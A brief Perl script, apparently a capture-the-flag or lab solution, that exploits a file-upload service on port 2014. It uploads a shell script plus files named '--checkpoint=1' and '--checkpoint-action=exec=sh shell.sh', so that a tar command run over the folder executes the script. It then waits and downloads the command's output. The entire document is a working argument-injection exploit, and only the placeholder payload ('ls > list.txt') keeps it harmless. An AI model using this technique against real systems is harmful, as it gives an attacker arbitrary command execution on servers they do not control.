#!/usr/bin/perl -wl

use HTTP::Tiny;

my $ip = shift // '127.0.0.1';
my $ua = HTTP::Tiny->new(timeout => 10);

$ua->put("http://$ip:2014/shell.sh", {content => 'ls > list.txt'});
$ua->put("http://$ip:2014/--checkpoint=1", {content => ''});
$ua->put("http://$ip:2014/--checkpoint-action=exec=sh%20shell.sh", {content => ''});

sleep 80;

my $response = $ua->get("http://$ip:2014/list.txt");
print $response->{content};
